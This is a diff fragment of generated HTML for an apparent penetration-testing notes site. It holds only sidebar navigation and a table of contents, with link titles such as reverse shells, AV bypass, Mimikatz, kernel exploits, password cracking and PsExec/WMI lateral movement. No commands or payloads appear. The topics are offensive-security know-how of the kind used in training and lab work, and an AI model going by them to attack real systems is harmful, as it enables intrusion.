+          <label class="md-nav__title" for="__nav_10">
+            <span class="md-nav__icon md-icon"></span>
+            Exploits
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Exploits/search/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Exploit Search Methodology
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
+        
+          
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Linux
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11">
+            <span class="md-nav__icon md-icon"></span>
+            Linux
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/1-priv-esc-methodology-linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux Privilege Escalation Cheatsheet
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/docker/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Priv Esc Docker
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/linux-priv-esc-permissions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux Priv Esc Though Permissions
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/linux-priv-esc-python/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Priviledge Escalation Using Python
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/network/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Network Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/passwd/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Write to /etc/passwd
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/reverse-shell/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Reverse Shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/smb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux SMB Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/using-curl/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Usage of curl
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Linux/using-tcpdump/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Using tcpdump
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+        
+          
+          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Network Enumeration
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_12">
+            <span class="md-nav__icon md-icon"></span>
+            Network Enumeration
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/Linux-Priv-Esc-Process/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Priviledge Escalation though process
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/ftp-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    FTP Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/nmap-scanning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Nmap Scanning 🗺️
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Network%20Enumeration/snmp-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SNMP Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Other Resources Notes
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13">
+            <span class="md-nav__icon md-icon"></span>
+            Other Resources Notes
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Other%20Resources%20Notes/linux-priv-esc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Linux Priv Esc
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Other%20Resources%20Notes/windows-privilege-escalation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Privilege Escalation Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_14" >
+        
+          
+          <label class="md-nav__link" for="__nav_14" id="__nav_14_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Password Fuzzing
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_14_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_14">
+            <span class="md-nav__icon md-icon"></span>
+            Password Fuzzing
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/default-passwords/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Default Passwords
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/emum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Password Guessing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/use-hashcat/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hashcat Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/use-hydra/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Hydra Cheatsheet for
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/use-john/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Usage Of John
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/using-burp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Use Burp Intruder
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Password%20Fuzzing/web-passwords/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzz Webapplication Password Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_15" >
+        
+          
+          <label class="md-nav__link" for="__nav_15" id="__nav_15_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Ports & Applications
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_15_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_15">
+            <span class="md-nav__icon md-icon"></span>
+            Ports & Applications
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/git/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Git Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/laravel/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Laravel Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-111-portmapper/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 111 - Portmapper
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-113/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 113 - Ident
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-161-snmp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SNMP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-21-ftp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 21: Fuzzing FTP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-22-ssh/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 22 - SSH
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-25-smtp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SMTP Stuff
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-3128-squid/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 3128: Fuzzing Squid Proxy
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-3389-rdp/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 3389 RDP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-445-smb/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzzing SMB
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-49152-rpcclient/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    RPC
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Ports%20%26%20Applications/port-53-dns/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Port 53 - Enumerate DNS
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_16" >
+        
+          
+          <label class="md-nav__link" for="__nav_16" id="__nav_16_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Usernames
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_16_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_16">
+            <span class="md-nav__icon md-icon"></span>
+            Usernames
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Usernames/enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Enumerate Usernames
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_17" >
+        
+          
+          <label class="md-nav__link" for="__nav_17" id="__nav_17_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web Applications
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_17_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_17">
+            <span class="md-nav__icon md-icon"></span>
+            Web Applications
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/apache-tomcat-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Apache Tomcat Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/automate-enum/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Automated Enumeration
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/fuzzing-php/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzzing with PHP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/mysql-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    MySQL Database Fuzzing &amp; Testing 🗄️
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/postgre-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Postgre Sql Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/sql-injection-fuzzing/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SQL Injection Fuzzing
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/web-fuzzing-with-ffuf/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Web Fuzzing Using FFUF 🔍
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Applications/wordpress/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Fuzzing Wordpress
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
+        
+          
+          <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Web Vulneratbilites
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_18">
+            <span class="md-nav__icon md-icon"></span>
+            Web Vulneratbilites
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Vulneratbilites/cmd-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Command Injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Vulneratbilites/lfi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Local File Inclusion (LFI)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Vulneratbilites/sql-injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Sql injection
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Web%20Vulneratbilites/xss/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Cross-Site Scripting (XSS)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19" >
+        
+          
+          <label class="md-nav__link" for="__nav_19" id="__nav_19_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Windows
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_19_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_19">
+            <span class="md-nav__icon md-icon"></span>
+            Windows
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/1-priv-esc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Privilege Escalation Guide
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/av-bypass/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    AV Bypass
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/download-file/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Download file to windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/file-permissions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    File Permissions On Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/kernel-exploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Kernel Exploits
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/mimkatz/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Usage of Mimkatz
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/powershell/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Powershell Commands
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/reverse-shell/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Reverse Shell
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/service-abuse/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Service Abuse
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/uac/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    UAC Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/windows-shell-help/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows Shell Helpul commands
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/winpeas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Winpeas Usage
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19_13" >
+        
+          
+          <label class="md-nav__link" for="__nav_19_13" id="__nav_19_13_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Groups
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_19_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_19_13">
+            <span class="md-nav__icon md-icon"></span>
+            Groups
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/Groups/server-operator-group/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Server Operator Group
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_19_14" >
+        
+          
+          <label class="md-nav__link" for="__nav_19_14" id="__nav_19_14_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Privileges
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_19_14_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_19_14">
+            <span class="md-nav__icon md-icon"></span>
+            Privileges
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/Privileges/SeBackupPrivilege/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Windows - SeBackupPrivilege
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Windows/Privileges/SeImporsornatePriv/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SeImpersonatePrivilege
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#overview" class="md-nav__link">
+    <span class="md-ellipsis">
+      Overview
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      Prerequisites
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Prerequisites">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#what-you-need" class="md-nav__link">
+    <span class="md-ellipsis">
+      What You Need
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#credential-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      Credential Types
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#psexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      PsExec
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="PsExec">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-sysinternals-psexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Sysinternals PsExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-psexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket PsExec
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#wmi-windows-management-instrumentation" class="md-nav__link">
+    <span class="md-ellipsis">
+      WMI (Windows Management Instrumentation)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="WMI (Windows Management Instrumentation)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#using-wmic" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using WMIC
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-impacket-wmiexec" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Impacket WMIExec
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-powershell-wmi" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using PowerShell WMI
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
